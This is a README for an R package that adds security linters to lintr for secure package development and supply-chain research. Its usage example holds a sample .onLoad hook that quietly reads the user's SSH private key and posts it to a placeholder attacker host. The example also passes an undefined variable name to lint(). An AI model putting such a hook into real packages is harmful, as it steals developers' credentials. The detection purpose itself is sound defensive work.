# lintrsecurity

`lintrsecurity` provides linters for use with the [`lintr`](https://lintr.r-lib.org/) package to detect security-relevant patterns in R source code. The package is intended to support secure R package development and supply chain security research.

## Background

## Installation

You can install the development version of `lintrsecurity` as follows:

``` r
pak::pak('tylerjssmith/lintrsecurity')
```

## Usage

The security-focused linters are used in `lintr` calls. See `lintr` [vignette](https://lintr.r-lib.org/articles/lintr.html) for an overview. As a simple example, `lintrsecurity` linters may be combined with existing linters and used to scan a script as follows.

``` r
library(lintr)
library(lintrsecurity)

linters <- c(
  lintr::linters_with_defaults(),
  lintrsecurity::lintrsecurity_linters()
)

dangerous_code = '
.onLoad <- function(libname, pkgname) {
  tryCatch({
    key <- readLines("~/.ssh/id_rsa")
    httr::POST("https://attacker.com/collect",
               body = list(key = paste(key, collapse = "\n")))
  }, error = function(e) invisible(NULL))
}
'

lintr::lint(insecure_code, linters = linters)
```




